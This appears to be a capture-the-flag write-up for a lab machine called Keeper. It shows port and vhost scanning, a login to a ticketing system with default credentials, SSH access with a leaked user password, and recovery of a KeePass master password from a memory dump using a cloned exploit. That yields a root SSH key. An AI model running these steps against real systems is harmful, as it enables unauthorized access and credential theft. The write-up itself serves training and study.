## Port Scan

```shell
─$ sudo nmap 10.129.229.41 -sS
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-22 08:46 CET
Nmap scan report for 10.129.229.41
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.95 seconds
```

The only active service is the web server on port 80 which has a single link to a subdomain where there is a login page. 

To reach the subdomain, we need it to be part of `/etc/hosts`, as usual.

## Dir and Vhosts enumeration

There is no other subdomain from Gobuster.

```shell
┌──(kali㉿kali)-[~]
└─$ gobuster -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt vhost --append-domain --domain keeper.htb -u 10.129.229.41
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://10.129.229.41
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: tickets.keeper.htb Status: 200 [Size: 4236]
Progress: 653911 / 653912 (100.00%)
===============================================================
Finished
===============================================================
```


## Best Practical RT

The login page at http://tickets.keeper.htb/rt/ is accessed. The default `root` and `password` credentials will work as the root user did not change his password.

Looking inside the data it is visible that the only user apart from root is `lnoorgard` and she has a default password `Welcome2023!` that will work for the SSH and so the User flag is already obtained.

## Privilege Escalation

In the user home directory there is a core dump for a Keepass file,  and the Keepass database.

There is an exploit available on GitHub to retrieve the master password from a Keepass database. This is done through a .NET program.

First of all install the Microsoft Framework in the user Home to execute it:

```shell
wget https://dot.net/v1/dotnet-install.sh -O dotnet-install.sh
chmod +x dotnet-install.sh
./dotnet-install.sh --version 7.0.404
```

Once installed download the Exploit and use it:

```shell
git clone https://github.com/vdohney/keepass-password-dumper.git
cd keepass-password-dumper
dotnet run <DMP FILE>
```

This will dump a password:

```shell
Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
```

We don't need to brute-force it as it can be found on Google: `rødgrød med fløde`
This is a Danish dish.

Now we can open the Keepass database using the password above and find the root password: `F4><3K0nd!` but unfortunately this will not work directly with ssh.

Looking better inside the Keepass database, there is also a dump of a PuTTY key file that we can try to conver to OpenSSH keys. We can copy paste the file content into a `key.ppk` file and then:

```shell
puttygen key.ppk -O private-openssh -o id_rsa
puttygen key.ppk -O public-openssh -o id_rsa.pub
mv id_rsa.pub id_rsa .ssh/
```

Once keys are created one can login as root:

```shell
ssh root@keeper.htb -i .ssh/id_rsa
```

And we can get the root flag in the home directory!
